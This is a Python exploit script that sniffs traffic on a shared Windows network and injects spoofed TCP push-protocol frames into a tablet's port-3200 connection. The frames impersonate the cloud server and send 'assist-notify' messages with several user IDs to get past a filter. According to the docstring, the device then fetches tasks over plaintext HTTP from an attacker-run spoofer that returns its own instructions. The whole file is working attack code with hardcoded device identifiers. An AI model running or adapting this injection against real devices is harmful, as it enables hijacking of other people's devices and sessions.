# -*- coding: utf-8 -*-
"""push_inject3.py -- multi-userId assist-notify burst on the 3200 push channel.

Fires N MESSAGE (cmd 0x03) frames back-to-back on the first pure-ACK from the
pad.  Each frame carries one PushMessage with a DIFFERENT userId so that
LauncherPushService's `SessionData.getUserId()` equality filter cannot drop
all of them.  subMsgType is "assist-notify" -> AssistModel.sendAssistMessage
-> AssistService.assistNotify -> startAssist() -> requestAssistTask()
-> plaintext HTTP GET /api/v1/users/<uid>/devices/<did>/assists/<aid>/tasks
which our :80 spoofer answers with ZAZE instructions.

Requires Administrator (Npcap capture is admin-only).
"""
import sys, os, time, datetime, json, struct, threading, warnings
warnings.filterwarnings("ignore")
from scapy.all import Ether, IP, TCP, Raw, conf, AsyncSniffer
from scapy.arch.windows import get_windows_if_list

BASE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, BASE)

PAD_MAC = "80:20:fd:8b:4b:fa"
ICS_MAC = "8c:81:2b:20:7b:42"
IFINDEX = 30
PORT = 3200
WATCH = int(sys.argv[1]) if len(sys.argv) > 1 else 1800
LOG = os.path.join(BASE, "push_inject3.log")

ASSIST_ID = os.environ.get("PUSH_ASSIST_ID") or "assist_marvis_0001"
DEVICE_ID = os.environ.get("PUSH_DEVICE_ID") or "R52N9067SSF"
CLIENT_ID = os.environ.get("PUSH_CLIENT_ID") or "3f025ad519274a6795aaf5161efd7726"
UIDS = (os.environ.get("PUSH_UIDS") or "2112229,0,316724,10001").split(",")


def wlog(s):
    line = "%s %s" % (datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3], s)
    try:
        with open(LOG, "a", encoding="utf-8") as f:
            f.write(line + "\n")
    except Exception:
        pass
    try:
        print(line, flush=True)
    except Exception:
        pass


def iface_name():
    for d in get_windows_if_list():
        if d.get("index") == IFINDEX:
            return r"\Device\NPF_" + d["guid"]


_sock = None


def send(frame):
    global _sock
    if _sock is None:
        _sock = conf.L2socket(iface=iface_name())
    _sock.send(frame)


def emit(cloud, pad_ip, sport, seq, ack, payload):
    send(Ether(dst=PAD_MAC, src=ICS_MAC) /
         IP(src=cloud, dst=pad_ip, ttl=64) /
         TCP(sport=PORT, dport=sport, flags="PA", seq=seq, ack=ack, window=64240) /
         Raw(payload))


def build_frame(cmd, content, version=1):
    value = len(content) + 3
    n = 0
    v = value >> 6
    while v > 0:
        n += 1
        v >>= 8
    out = bytearray([0x09, version & 0xFF, cmd & 0xFF])
    out.append(((n & 3) << 6) | ((value >> (8 * n)) & 0x3F))
    for i in range(n - 1, -1, -1):
        out.append((value >> (8 * i)) & 0xFF)
    return bytes(out + content)


def build_message(msgid, entries):
    body = json.dumps(entries, ensure_ascii=False).encode("utf-8")
    content = bytearray([0x00])
    content += struct.pack(">H", len(entries))
    content += struct.pack(">q", msgid)
    content += struct.pack(">i", len(body))
    content += body
    return build_frame(0x03, bytes(content))


def notify_frame(uid, msgid):
    try:
        uid_i = int(uid)
    except Exception:
        uid_i = 0
    # Gson maps AssistNotify by FIELD NAME -> the key must be "assistId", NOT "id".
    # (AssistNotify.parseJsonObject() reads "id", but assistNotify() uses
    #  JsonUtil.parseJson(..., AssistNotify.class) which is plain Gson.)
    notify = {"assistId": ASSIST_ID, "hidden": 1, "operate": "ENTRY",
              "deviceId": DEVICE_ID, "userId": uid_i}
    push = {"appId": "zty_stu", "subAppId": "zty_stu", "clientId": CLIENT_ID,
            "msgId": str(msgid), "msgType": "assist-notify",
            "subMsgType": "assist-notify",
            "payload": json.dumps(notify, ensure_ascii=False),
            "userId": str(uid_i), "style": 0}
    return build_message(msgid, [{"msgId": msgid,
                                  "content": json.dumps(push, ensure_ascii=False)}])


T0 = int(time.time() * 1000)
BURST = []
for i, u in enumerate(UIDS):
    BURST.append((u.strip(), notify_frame(u.strip(), T0 + i)))
TOTAL = sum(len(b[1]) for b in BURST)
state = {"pad_pkts": 0, "pad_data": 0, "burst": 0, "acked": 0}
done = [False]


def on_pkt(p):
    try:
        if not (p.haslayer(TCP) and p.haslayer(IP)):
            return
        ip, t = p[IP], p[TCP]
        if not ip.src.startswith("192.168.137.") or t.dport != PORT:
            return
        state["pad_pkts"] += 1
        pl = bytes(t.payload) if t.payload else b""
        if pl:
            state["pad_data"] += 1
            return
        if done[0]:
            return
        if state["burst"]:
            end = (state["seq0"] + TOTAL) & 0xFFFFFFFF
            d = (t.ack - end) & 0xFFFFFFFF
            if d == 0 or d < 0x40000000:
                state["acked"] = 1
                done[0] = True
                wlog("*** BURST ACKED *** n=%d end=%08x pad.ack=%08x" % (len(BURST), end, t.ack))
            return
        seq = t.ack
        state["seq0"] = seq
        off = 0
        for uid, fr in BURST:
            emit(ip.dst, ip.src, t.sport, (seq + off) & 0xFFFFFFFF, t.seq, fr)
            off += len(fr)
        state["burst"] = 1
        wlog(">>> BURST TX uids=%s seq=%08x total=%dB frames=%s" %
             (",".join(u for u, _ in BURST), seq, TOTAL,
              ",".join(str(len(f)) for _, f in BURST)))
    except Exception as e:
        wlog("ERR %s %s" % (type(e).__name__, e))


def main():
    with open(LOG, "a", encoding="utf-8") as f:
        f.write("\n===== push_inject3 start %s watch=%ds uids=%s =====\n" %
                (datetime.datetime.now(), WATCH, UIDS))
    for u, fr in BURST:
        wlog("frame uid=%s len=%d" % (u, len(fr)))
    sn = AsyncSniffer(iface=iface_name(), store=False, prn=on_pkt, filter="ip")
    sn.start()
    t0 = time.time()
    while time.time() - t0 < WATCH and not done[0]:
        time.sleep(10)
        wlog("[stat] %s" % state)
    # keep watching a bit for the pad's reaction
    t1 = time.time()
    while time.time() - t1 < 60:
        time.sleep(10)
        wlog("[post] %s" % state)
    sn.stop()
    wlog("[end] %s" % state)


if __name__ == "__main__":
    main()
